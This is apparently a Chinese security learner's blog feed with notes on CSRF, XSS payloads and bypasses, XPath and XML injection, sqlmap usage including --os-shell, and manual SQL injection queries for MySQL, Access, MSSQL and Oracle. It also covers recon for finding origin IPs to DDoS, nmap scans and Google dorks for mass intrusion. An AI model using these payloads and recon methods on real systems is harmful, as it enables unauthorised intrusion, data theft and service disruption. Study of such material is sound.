<p>当然，还以当他打开时就自动提交，例如：添加JS机制。<br>添加JS后修改的代码如下：<br><img src="http://i.imgur.com/7A84RE2.png" alt=""><br><strong>其实这样是错误的。。因为没有执行”submit”按钮</strong></p>
<p>想了好久想不通，找了个程序员大牛把代码修改了一下下，直接提交整个表单就得了，代码如下：<br><img src="http://i.imgur.com/b1hCUrx.png" alt=""><br>注： js提交表单时不会带上 submit 按钮的值(因为没有被点击) 所有浏览器<br>input 回车提交 w3c浏览器会带上submit按钮的值，ie6则不会带<br>（所以把提交按钮的类型从submit换成了password.）</p>
<p>【只要点开这个文本就执行代码】</p>
<hr>
<p>当然，，管理员对于未知文件怎么可能会轻易点开呢，<br>所以我们还有个XSS+CSRF的利用方法（不知是不是这就是大佬们说的绝配。）<br>前提：存在个XSS点。且熟悉ajax操作。<br>因为不熟悉，所以。。</p>
]]></content>
      
        
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XSS]]></title>
      <url>/2017/04/10/XSS/</url>
      <content type="html"><![CDATA[<p>Xss（CSS）：跨站脚本漏洞。分为存储型、反射型、DOM型。一般使用javascript语言编写（还有ActionScript/VBScrip等客户端脚本语言）。<br>反射型（非持久性）：不存储在服务器端，例如发送一个带有XSS的URL<br>存储型（持久性）：储存在服务器端，当用户访问带有XSS页面时，解析XSS代码。例如留言板。<br>DOM型：没怎么了解，后续了解了再补充。<br><a id="more"></a><br>javascript可以用来获取用户的Cookie、改变页面内容\URL跳转等。<br>Xss测试语句：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;</div><div class="line"><span class="string">"/&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;"</span>（闭合Input标签）</div><div class="line">‘”()%26%25&lt;acx&gt;&lt;ScRiPt &gt;alert(9528)&lt;/ScRiPt&gt;（大小写绕过）</div><div class="line"><span class="string">" onmouseover=alert(document.domain) align="</span>left（需移动鼠标）</div><div class="line"> “onclick=”alert(‘1’)      （需要点击框才弹）</div><div class="line"> &lt;img src=x onerror=alert(‘1’)&gt; </div><div class="line">&lt;body onload=alert(‘XSS’)&gt;</div><div class="line">...</div></pre></td></tr></table></figure></p>
<hr>
<p>XSS例子:<br><img src="http://i.imgur.com/IaYq4Ao.png" alt=""><br>ARRAY_KEY_EXISTS():判断函数，如果name变量有值&amp;&amp;（与）不为空，则输出 “  Hello+&amp;_GET[‘name’]  “。<br><strong>思路：无过滤，直接XSS代码可执行。</strong></p>
<hr>
<p><img src="http://i.imgur.com/d67sv4O.png" alt=""><br>Str_replace():<br>判断是否存在<code>&lt;script&gt;</code>,存在则把<code>&lt;script&gt;</code>替换成空格，然后再把输入的东西传递给name变量。再输出。<br><strong>思路：运用不带有<code>&lt;script&gt;</code>的Javascript语言去运行XSS代码，或者把&lt; script&gt;大小写。</strong></p>
<hr>
<p><img src="http://i.imgur.com/5xVlDW1.png" alt=""><br>Prog_replace()：和楼上类似。不过是执行一个正则表达式的搜索和替换。比楼上的高级，它会对用户所有的有效输入字符进行匹配检查，并将无效字符替换为空。<br><strong>思路：还是和楼上一样，只不过是不能运用这<code>&lt;script&gt;</code>这些字符，大小也不可以。但是我们可以用其它标签，比如body标签、img标签等。</strong></p>
<hr>
<p><img src="http://i.imgur.com/4wY5s6k.png" alt=""><br>checkToken：用来检查session_token是否过期。<br>Htmlspecialchars()：把预定义字符（&amp;、”、&lt;、&gt;）转为HTML实体化的的函数（只有设置了：quotestyle 选项为ENT_QUOTES才会过滤单引号）。</p>
<p>**思路：1.因为没有过滤单引号，所以可以用 ‘onmouseover=alert’(1)’语句来弹窗，但是然并卵，，</p>
<p>2.跳出Htmlspecialchars()函数重新赋值给$name，例POC：<br><img src="http://i.imgur.com/G6ZKw4k.png" alt=""><br>但还是不行，因为你在构造的时候就已经被实体化了，后面的语句根本无法有效运行。</p>
<p>思路暂时没有，，等有想法再补充。</p>
<hr>
<p>XSS绕过：<br>1.利用空格或者回车<br>2.对标签属性进行编码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=javascrip&amp;<span class="comment">#116&amp;#58alert('xss')&gt;</span></div></pre></td></tr></table></figure></p>
<p>3.大小写<br>4.用eval函数进行十六进制和十进制的编码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=<span class="string">"javascript:eval(string.formCharCode(97,98,99.....))"</span>&gt;</div></pre></td></tr></table></figure></p>
<hr>
<p>注：<br>1.输入的东西是否被转移，看源代码即可<br>2.对website有http-only、crossdomian.xml没有用<br>3.可以明面上输入&lt; “ &gt; ‘ 等字符测试，看源代码有哪些没被转义就用哪些。<br>4.需要大量测试（测试闭合标签）</p>
<hr>
<p>经典：<a href="http://www.freebuf.com/articles/web/40520.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/40520.html</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[代码注入之XPath篇]]></title>
      <url>/2017/04/08/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E4%B9%8BXPath%E7%AF%87/</url>
      <content type="html"><![CDATA[<p>XPath：XML的路径语言（选取XML节点的一门语言）<br>（和XML注入类似）</p>
<hr>
<p>例如 user.xml文件是这么写的：</p>
<pre><code class="bash">&lt;users&gt;
     &lt;user&gt;
         &lt;firstname&gt;Ben&lt;/firstname&gt;
         &lt;lastname&gt;Elmore&lt;/lastname&gt;
         &lt;loginID&gt;abc&lt;/loginID&gt;
         &lt;password&gt;<span class="built_in">test</span>123&lt;/password&gt;
     &lt;/user&gt;
     &lt;user&gt;
         &lt;firstname&gt;Shlomy&lt;/firstname&gt;
         &lt;lastname&gt;Gantz&lt;/lastname&gt;
         &lt;loginID&gt;xyz&lt;/loginID&gt;
         &lt;password&gt;123<span class="built_in">test</span>&lt;/password&gt;
     &lt;/user&gt;
</code></pre>
<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><p>那XPath的一般查询语句是这样写的：</p>
<p>  //users/user[loginID/text()=’xyz’and password/text()=’123test’]</p>
<p>但是，可以采用如下的方法实施注入攻击，绕过身份验证。<br>如果用 户传入一个 login 和 password，例如 loginID = ‘xyz’ 和 password = ‘123test’，则该查询语句将返回 true。<br>但如果用户传入类似 ‘ or 1=1 or ‘’=’ 的值，那么该查询语句也会得到 true 返回值，因为 XPath 查询语句最终会变成如下代码：<br>//users/user[loginID/text()=’’or 1=1 or ‘’=’’ and password/text()=’’ or 1=1 or ‘’=’’]</p>
<p>这个字符串会在逻辑上使查询一直返回 true 并将一直允许攻击者访问系统。攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过XPath盲入技术获取最高权限帐号和其它重要文档信息。</p>
<hr>
<p>利用手段：和SQL+XSS注入类似，闭合符合，然后构造POC<br>利用位置：查询口</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[代码注入之XML篇]]></title>
      <url>/2017/04/08/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E4%B9%8BXML%E7%AF%87/</url>
      <content type="html"><![CDATA[<p>XML：可扩展标识语言（和超文本标记语言有点类似，不过标签是带有自定义性质的，带有补充超文本语言的性质）</p>
<p>（这个注入就是改写XML文件来利用。都需要闭合标签，然后插入数据，形式和SQL注入+XSS差不多）</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><p>报错语句:</p>
<p>‘ or (payload) or ‘<br>‘ and (payload) and ‘<br>‘ or (payload) and ‘<br>‘ or (payload) and ‘=’<br>‘(payload)’<br>‘ or (payload) and ‘</p>
<hr>
<p>下面是一个保存注册用户信息为XML格式的例子：</p>
<pre><code class="bash">   final String GUESTROLE = <span class="string">"guest_role"</span>;
   ...
//userdata是准备保存的xml数据，接收了name和email两个用户提交来的数据。


String userdata = <span class="string">"&lt;USER role="</span>+
                GUESTROLE+
                <span class="string">"&gt;&lt;name&gt;"</span>+
                request.getParameter(<span class="string">"name"</span>)+
                <span class="string">"&lt;/name&gt;&lt;email&gt;"</span>+
                request.getParameter(<span class="string">"email"</span>)+
                <span class="string">"&lt;/email&gt;&lt;/USER&gt;"</span>;
//保存xml
userDao.save(userdata);
</code></pre>
<hr>
<p>当上面这段代码没有任何过滤时，一个普通用户注册会是这样的↓</p>
<pre><code class="bash">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;
&lt;USER role=<span class="string">"guest_role"</span>&gt;
     &lt;name&gt;user1
     &lt;/name&gt;
     &lt;email&gt;user1@a.com
     &lt;/email&gt;
&lt;/USER&gt;
</code></pre>
<p>但攻击者注册时如果这样注册，构造利用代码如下：</p>
<pre><code class="bash">user1@a.com&lt;/email&gt;&lt;/USER&gt;&lt;USER role=<span class="string">"admin_role"</span>&gt;&lt;name&gt;<span class="built_in">test</span>&lt;/name&gt;&lt;email&gt;user2@a.com
</code></pre>
<hr>
<p>最终用户注册后，数据就变成了↓：</p>
<pre><code class="bash">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;
&lt;USER role=<span class="string">"guest_role"</span>&gt;
    &lt;name&gt;user1
    &lt;/name&gt;
    &lt;email&gt;user1@a.com&lt;/email&gt;
&lt;/USER&gt;
&lt;USER role=<span class="string">"admin_role"</span>&gt;
    &lt;name&gt;lf&lt;/name&gt;
    &lt;email&gt;user2@a.com
    &lt;/email&gt;
&lt;/USER&gt;
</code></pre>
<p>##很明显，多出了一条role=“admin_role”的管理员test。以达到攻击目的。##</p>
<hr>
<p>防御：对关键字进行转义，<br>   例：</p>
<pre><code class="bash">&amp; --&gt; &amp;amp;
&lt; --&gt; &amp;lt;
&gt; --&gt; &amp;gt;
<span class="string">" --&gt; &amp;quot;
' --&gt; &amp;#39;</span>
</code></pre>
<p>具体函数：StringUtil.xmlencode（）</p>
<hr>
<p>绕过：<br>闭合（包括闭合函数）→重新构造整个代码，包括函数（当然这是我自己认为的，没实施过。。）</p>
<p>利用位置：注册口</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL注入之sqlmap工具使用]]></title>
      <url>/2017/04/08/SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>NMAP的使用：<br>  常用命令：-u （后面接URL，判断注入，有注入则回显服务器信息）<br>    　　　　　–dbs  查看所有数据库<br>　　　　　–current-db  列出当前所用的数据库<br>　　　　　–table 获取数据库表 （接 –D使用;  因为要知道是哪个数据库的表）<br>　　　　　–columns 获取表中的字段 （接 –T，-D使用，因为要知道哪个表那个数据库）<br>　　　　　–dump 获取字段内容 （接-C,-T,-D使用，和上同理。。）<br>　　　　　–r    利用文本（接编码转换文本或HTTP协议包）</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><p>以下为Mysql数据注入：</p>
<ol>
<li><p>-u www.xxx.com/qqq.php?id=1  存在注入，则爆出(网页信息)↓<br><img src="http://i.imgur.com/hXYJAAk.png" alt=""></p>
</li>
<li><p>-u www.xxx.com/qqq.php?id=1 –dbs  爆出所有数据库<br><img src="http://i.imgur.com/qUdI66I.png" alt=""></p>
</li>
<li><p>选择bsgy数据库并爆表  -u www.xxx.com/qqq.php?id=1 –D “bsgy”  –table<br><img src="http://i.imgur.com/GNePxTp.png" alt=""></p>
</li>
<li><p>选择lefttree表，并爆字段<br>-u www.xxx.com/qqq.php?id=1 –D “bsgy”  -T “lefttree”  –columns<br><img src="http://i.imgur.com/r8WPdQL.png" alt=""></p>
</li>
<li><p>爆字段内容<br>-u www.xxx.com/qqq.php?id=1 –D “bsgy”  -T “lefttree”  –C “id,name” –dump<br><img src="http://i.imgur.com/lmnaBaL.png" alt=""></p>
</li>
</ol>
<hr>
<p>Accessz注入：–table（直接猜表名）然后思路同理<br>因为Access没有内置的数据库，而且只有一只，所以直接跑表</p>
<hr>
<p>注：<br>其它命令：<br>1.测试所有用户权限：–privileges   （接-U可指定用户）<br>2.执行shell命令（需要知道物理路径且可写）：<br>　　–os-cmd=”cmd命令”<br>　　–os-shell<br>3.post 提交：–data “post参数”  （–forms可能会自动检测）<br>4.显示详细参数：-v 0~6   （0~6代表信息等级，）<br>5.cookies注入：–cookie –lever 3  （&gt;=2即可，3的话会检查User-agent和Referer）<br>6.数据包注入：-r 要注入的文本   （文本的某一处加‘*’则选择在哪注入，不加则默认是头部注入，这方式适合伪静态注入）<br>7.注入时使用编码：–tamper ‘py文本’ (适用黑名单绕过)　　　　　　　                 　　1.space2hash.py 2.base64encode.py 3.charencode.py<br>8.延时注入： –delay 1(时间,可随意)<br>　　　　　　 –safe-freq 1(次数,可随意)</p>
<hr>
<p>注入工具还有：穿山甲（pangolin） / Havij（小萝卜）。。。<br>            编写人不同，注入方法也不通，都试试吧，可能某一个得呢。。</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL手工注入之mysql]]></title>
      <url>/2017/04/08/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql/</url>
      <content type="html"><![CDATA[<p>mysql数据库</p>
<ul>
<li>版本5.0↑，具有内置特定数据库（information_schema）。</li>
<li>最高权限为root<a id="more"></a>
</li>
</ul>
<hr>
<p>注入过程：</p>
<ol>
<li>判断字段数 （order by）</li>
<li>匹配字段数：union select 1,2,3,4,5…….  </li>
<li>利用内置函数暴数据库信息<br>system_user() 系统用户名<br>user() 用户名<br>current_user() 当前用户名<br>session_user() 链接数据库的用户名<br>database() 数据库库名<br>version() mysql数据库版本信息<br>load_file() 转换成16或10进制 读取本地文件<br>@@datadir 读取数据库路径<br>@@basedir MYSQL安装路径<br>@@version_compile_os 操作系统</li>
<li>查表：<br>Union  selec  1,group_concat(table_name) ,3 from<br>information_schema.tables where table_schema= 数据库名的hex编码</li>
<li>表里面的列<br>union select 1,group_concat(column_name),3  from<br>information_schema.columns  where<br>table_name=表的HEX值</li>
<li>Union select 1,group_concat(列名),3 from 表名</li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL手工注入之Oracle]]></title>
      <url>/2017/04/08/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E4%B9%8BOracle/</url>
      <content type="html"><![CDATA[<p>文章：<a href="http://www.2cto.com/article/201301/186345.html" target="_blank" rel="external">http://www.2cto.com/article/201301/186345.html</a></p>
<hr>
<p>注：字段位置应写为null..不可以用数字，因为Oracle是强类型数据库。必须表明类型，null就可避免类型限制。</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL手工注入之Access]]></title>
      <url>/2017/04/08/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E4%B9%8BAccess/</url>
      <content type="html"><![CDATA[<p>Access（数据库后缀名为：.mdb）</p>
<p>数据库结构：<br><a id="more"></a><br><img src="http://i.imgur.com/36xkh4X.png" alt=""></p>
<hr>
<ol>
<li>判断是否存在注入（报错，“*”and/or;在网址最后输入（’；）,返回不正常的时候,说明是access类型的。反之，则是mssql类型）</li>
<li>判断数据库表名：and exists(select * from [表名])</li>
<li>判断数据库列名：and exists(select [列名] from [表名])</li>
<li>判断字节长度：order by 数字</li>
<li>联合查询注入：union select 1,2,… from [表名]</li>
<li>根据数字位置爆数据。</li>
</ol>
<hr>
<p>偏移注入（知道表名却不知道列名的情况下使用）：<br>假设表名为admin。初始字段数为12</p>
<ol>
<li>判断字段数（order by ）</li>
<li>爆显示位</li>
<li>用“<em>”代替字符，计算</em>代替字符的位数</li>
<li>当访问：<a href="http://127.0.0.1/0/Pro/P.asp?id=1513" target="_blank" rel="external">http://127.0.0.1/0/Pro/P.asp?id=1513</a> UNION SELECT<br>1,2,3,4,5,6,7, <em>  from admin 页面返回正确（说明admin表有7个字段）<br>if：已经减去了五个字段<br>则</em> = 5个字符<br>2 x * = 10个字符<br>12-10=2个字符</li>
<li><a href="http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513" target="_blank" rel="external">http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513</a> UNION  SELECT 1,2,a.id,b.id, * from (admin as a inner join admin as b on a.id=b.id)</li>
<li>如果不显示可以查看元素看看是不是隐藏了</li>
<li>真没有就二级偏移注入。。</li>
<li>再减7个字段 POC写成：<br>UNION  SELECT 1,2,a.id,b.id,c.id * from ((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=b.id)</li>
<li>三级。。。</li>
<li>四级。。。。<br>。。。</li>
</ol>
<hr>
<p>跨库注入（知道数据库的绝对路径，然后猜表名）：</p>
<ol>
<li>and exists(select * from 数据库绝对路径.表名)</li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL手工注入之SQL Server（mssql）]]></title>
      <url>/2017/04/08/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E4%B9%8Bmssql/</url>
      <content type="html"><![CDATA[<ol>
<li>SQL  Server（mssql）（一般搭配asp/asp.net(aspx)+mssql）</li>
</ol>
<p>数据库结构：<br><a id="more"></a><br><img src="http://i.imgur.com/91xXxPj.png" alt=""></p>
<hr>
<p>权限：1.最高：sa（任何操作：文件管理/数据库操作/命令执行等）<br>2.普通：db（文件管理，数据库操作等）<br>3.最菜：public（数据库操作）</p>
<hr>
<p>注入（手工判断）：</p>
<ol>
<li>And 1=1和and 1=2 组合判断 （用永真和永假判断）</li>
</ol>
<ol>
<li>and (select count(*) from sysobjects)&gt;0 返回正常就是mssql数据库</li>
</ol>
<p>版本信息查看：and 1=(select @@version)<br>获取当前网站所用数据库库名：and 1=(select db_name())<br>获取第一个数据库库名：<br>and 1=(select top 1 name from master..sysdatabases where dbid&gt;4)<br>获取第二个数据库库名：<br>and 1=(select top 1 name from master..sysdatabases where dbid&gt;4 and name &lt;&gt; ‘第一个数据库库名’)<br>获取第三个数据库库名：<br>and 1=(select top 1 name from master..sysdatabases where dbid&gt;4 and name &lt;&gt; ‘第一个数据库库名’ and name &lt;&gt; ‘第二个数据库库名’)<br>其它同理。。。。</p>
<ol>
<li>获取第一个当前使用的数据库表名：<br>and 1=(select top 1 name from sysobjects where xtype=’u’)<br>and 1=(select top 1 name from sysobjects where xtype=’u’ and name &lt;&gt;’第一个表名’)<br>其它同理。。。</li>
<li>获取第一个当前使用的数据库的表里面的列名：<br>and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = ‘表名’))<br>获取第二个列明<br>and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = ‘表名’)and name&lt;&gt; ‘第一个列名’)<br>其它同理。。</li>
<li>获取列内容（假如表是users列是name）<br>and 1=(select top 1 name from users)<br>其它同理。。。。</li>
</ol>
<hr>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL注入之类型简介]]></title>
      <url>/2017/04/08/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E7%AE%80%E4%BB%8B/</url>
      <content type="html"><![CDATA[<p>SQL注入原理：SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。<br>（数据库语句没有进行严密的过滤，致使执行非法查询）</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><p>SQL分类：1.数字型注入<br>         2.字符型注入</p>
<pre><code>3.搜索型注入
</code></pre><hr>
<p>数字型:参数为数字。<br>       例：www.test.com/test.php?id=123<br>字符型：参数为字符（英文字符串）<br>       例：www.test.com/test.php?id=asd<br>搜索型：注入位置为搜索框<br>例：</p>
<h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="http://i.imgur.com/eUlJs65.png" alt=""></h2><p>区别：SQL查询语句不相同。<br>数字型：$sql=”select <em> from A where id=$id”;<br>字符型：$sql=”select </em> from B where id=’$user ‘“;<br>搜索型：$sql=”select * from user where username like ‘%$name%’ order by username”;</p>
<hr>
<p>注入方式：GET，（请求头，URL位置）<br>Post，（表单提交的注入，例：登陆框）<br>Cookies,（利用Cookie 注入中转/手工编辑新的Cookies也可，即把参数写道Cookie里面（firebug里有编辑Cookie的插件））</p>
<h2 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="http://i.imgur.com/pgskScI.png" alt=""></h2><p>数据库分类：<br>1). SQL Server （别名：mssql）<br>2). Access<br>3). Oracle<br>4). MySql<br>5). Sysbase<br>6). Informix<br>7). FoxPro<br>8). PostgreSQL<br>9). IBM 的DB2</p>
<p>前面四种是常见的，包含了大多数的中小企业，所以暂时先讲这四种，等哪天我成为大神再补充。后面的五种。。。就这样。</p>
<hr>
<p>注：1.数据库不同，查询语句的连接符也不同<br>     Mssql：“+”<br>     Oracle：“||”<br>     Mysql:：空格<br>     Access：“&amp;”</p>
<ol>
<li>灵活运用：or/and/xor/+</li>
<li>后台，审查元素，name属性有意想不到的结果（写着字段）</li>
<li>下载CMS分析</li>
</ol>
<hr>
<p>基于布尔的SQL盲注—-构造逻辑判断<br>基于时间的盲注—延时注入<br>基于报错的盲注</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[信息收集之CMS]]></title>
      <url>/2017/04/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCMS/</url>
      <content type="html"><![CDATA[<p>主要CMS：<br>discuz ,dedecms（织梦）,wordpress,phpcms,jeecms,joomla,动易，</p>
<hr>
<ol>
<li>查看robots.txt</li>
<li>网页图标</li>
<li>主页最下面的一栏信息</li>
<li>通过站长工具的Whois或者zoomeye.org…</li>
<li>后台模板</li>
<li>工具（椰树，m7lrv）<a id="more"></a>
</li>
</ol>
<p>作用：方便上网查询相关CMS漏洞、后台位置、默认密码等</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[信息收集之真实IP查询]]></title>
      <url>/2017/04/08/%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B%E4%B9%8B%E7%9C%9F%E5%AE%9EIP%E6%9F%A5%E8%AF%A2/</url>
      <content type="html"><![CDATA[<ol>
<li>ping  (ping带WWW、和ping不带www)    （不一样则存在CDN）</li>
<li>采集二级域名（子域名）（URL采集工具）<br>URL采集(子域名挖掘)→<br>域名批量查询（<a href="http://ip.chinaz.com/ipbatch）→" target="_blank" rel="external">http://ip.chinaz.com/ipbatch）→</a><br>找非节点（CDN）IP→<a id="more"></a></li>
<li>查看接受收的邮件，显示原文，看IP</li>
<li>基本上所有的大站都有一个段（C段），这个段可能会有几个系统，且ip很接近 </li>
<li>通过威胁情报平台<br>360: <a href="https://ti.360.com/#" target="_blank" rel="external">https://ti.360.com/#</a><br>ThreatBook: <a href="https://x.threatbook.cn" target="_blank" rel="external">https://x.threatbook.cn</a></li>
<li>查域名历史IP(在历史解析里面一般存在真实IP段)<br><a href="http://viewdns.info/iphistory/?domain=" target="_blank" rel="external">http://viewdns.info/iphistory/?domain=</a><br><a href="https://www.zoomeye.org" target="_blank" rel="external">https://www.zoomeye.org</a><br>www.shodan.io</li>
<li>全网扫描<br><a href="http://www.evil0x.com/posts/6547.html" target="_blank" rel="external">http://www.evil0x.com/posts/6547.html</a></li>
<li>查防护软件等信息（出现防护警告时）<br>查看元素→网络→消息头→X-Safe-Firewall<br>搜索 防护提示符</li>
</ol>
<hr>
<p>找真实IP的作用：运用DDOS攻击（分布式拒绝服务攻击）/直接尝试连接服务器配合<br>DDOS作用：造成防火墙处理错误锁死、服务器瘫痪<br>CDN作用：实时的根据网络流量和个节点的接连、负载情况以及用户的距离和相信时间将用户的请求重新导向离用户最近的服务器节点上。内容服务基于缓存服务器，也称为代理缓存。</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[信息探测之nmap的使用（端口）]]></title>
      <url>/2017/04/08/%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B_%E7%AB%AF%E5%8F%A3%E7%AF%87/</url>
      <content type="html"><![CDATA[<p>Nmap:可用于端口扫描/指纹识别/检测SQL注射/网页爬行/数据库密码检查等</p>
<p>Nmap参数的使用：<br>              -sT  TCP连接扫描  （被扫描的系统会产生大量连接信息并写入日记）<br>             -sS  半开扫描  (即TCP SYN扫描) 很少系统把他写入系统日记<br>             -sN/sF  Fin数据包扫描  （即使SYN扫描都无法确定的情况下使用）<br>             -sP  ping扫描  （测试一个段的主机存活IP）<br>             -sU  UDP扫描  （因为不可靠，所以一般不用）<br><a id="more"></a><br>             -sA  穿过防火墙的规律集<br>             -sV  探测端口服务版本<br>             -P0  当被禁止Ping时可用此选项扫描<br>             -v   显示扫描过程<br>             -p   指定端口扫描（只扫描3389和80   -p “3389、80”）</p>
<hr>
<p>利用方法：<br>扫描www.baidu.com   的C段存活主机<br>    Nmap –sP  www.baidu.com/24<br>    注：假如扫描为IP （222.332.186.121），<br>    应为 222.332.186.0/24</p>
<p>指定端口扫描：<br>    Nmap  www.baidu.com(或填服务器IP)  –p 80，3389，1433，（或1~X）</p>
<p>检查主机系统：<br>   Nmap –o www.baidu.com(或填服务器IP)   </p>
<h2 id=""><a href="#" class="headerlink" title=""></a><!-- more --></h2><p>端口：<br>    8080（Apache/Tomcat/Nginx/Axis2）,<br>    21（控制端口）； 20（数据端口）；69（tftp小型文件传输协议）[FTP]<br>    3306(MySQL数据库)<br>    1433（Server 数据库服务）、1434（Monitor 数据库监控）  (MSSQL数据库)<br>    1521（数据库端口）、210（Oracle XDB FTP服务） (Oracle数据库)<br>    25（smtp）、465（smtps）(SMTP协议)<br>    53(DNS服务)<br>    67&amp;68、546（DHCP服务）<br>    22(SSH服务)<br>    80/81/443(IIS服务)<br>    7001(WebLogic)<br>    1098/1099/4444/4445/8080/8009/8083/8093(Jboss)<br>    908*；第一个应用就是9080，第二个就是9081；控制台9090(Websphere)</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[信息探测之谷歌黑客语法的使用]]></title>
      <url>/2017/04/08/%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B_%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95/</url>
      <content type="html"><![CDATA[<p>Google Hack:<br>（大部分语法也可用于百度）</p>
<p>主要语法：<br>Site：找到与指定网站有联系的URL。 （用于搜索子域名）<br>Intext：正文存在关键字的网页  （搜索重要信息）<br>Intitle：标题中存在关键字的网页 （搜索后台等具有关键字的URL）<br>Inurl：url中存在关键字的网页 （寻找伪静态持有的网页类型）<br>Filetype:指定文件类型<br><a id="more"></a><br>Site和inurl区别：<br>Site:把搜索范围限定在特定站点中<br>Inurl:吧搜索范围限定在url链接中</p>
<p>多种组合能达到意想不到的效果：<br>例如：<br>查看后台：<br>inurl:baidu.com   intext:后台管理<br>查看上传点:<br>site:xx.com inurl:file<br>site:xx.com inurl:load<br>inurl:baidu.com    Intitle:上传<br>查看ASP语言的后台<br>Intitle:后台管理   filetype:asp<br>星云CMS系统<br>inurl:Showservices.asp?id=</p>
<h2 id="inurl-showkbxx-asp-id"><a href="#inurl-showkbxx-asp-id" class="headerlink" title="inurl:showkbxx.asp?id="></a>inurl:showkbxx.asp?id=</h2><p>利用：<br>1.假如攻击者拥有的一个0day漏洞，则可以用此语法配合0day指纹进行批量的入侵。<br>2.寻找网页后台（admin/login）、敏感文件（robots.txt/db.mdb）、敏感路径（upload）</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[漏洞扫描之工具使用篇]]></title>
      <url>/2017/04/08/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/</url>
      <content type="html"><![CDATA[<p>常用工具：AWVS/Appscna/Netsparker工具的使用</p>
<p>AWVS功能：<br>Tools（工具）<br>Web scanner  网站漏洞扫描<br>           Site Crawler    网站爬行<br>           Target Finder   扫描自定网段，开放指定端口的服务器<br>           Subdomain Scanner  子域名扫描<br>           Blind SQL injection  Sql盲注手工测试<br>           HTTP Editor  HTTP信息查看编辑<br>           HTTP  Sniffer      HTTP监听嗅探<br>           HTTP  fuzzer       HTTP模糊测试<br><a id="more"></a><br>           Authentication Tester   HTTP认证测试<br>           Compare Results     对比两次Acunetix扫描结果<br>           Web Servces（Web服务）<br>           Web Services Scanner  网站服务扫描<br>           。。。。。。。。。。         网站服务手动分析<br>           Configuration（配置）<br>            Application Settings 应用程序设置<br>            Scan Settings       扫描设置<br>            Scanning Profiles    配置所用扫描脚本<br>            General（一般）<br>            。。。。。。。。。。。。。。。。。（AWVS的相关信息，破解版略过）</p>
<hr>
<p>步骤：点击New Scan后可傻瓜式点击Next…<br>     注：当点击第二布Options时可选择扫描类型<br><img src="http://i.imgur.com/xIs6zPZ.png" alt=""></p>
<p>（没有针对性的话一般使用Default）</p>
<p>注：当点击Target时可查看网页服务器的类型</p>
<p><img src="http://i.imgur.com/wFQFLX4.png" alt=""></p>
<p>扫描结果：<br><img src="http://i.imgur.com/tV4s8ot.png" alt=""></p>
<hr>
<p>Site Crawler 的利用：<br>输入URL，啪啪啪啪啪啪啪，就出来一堆“能看到的URL”了。<br><img src="http://i.imgur.com/Fqisr1P.png" alt=""></p>
<hr>
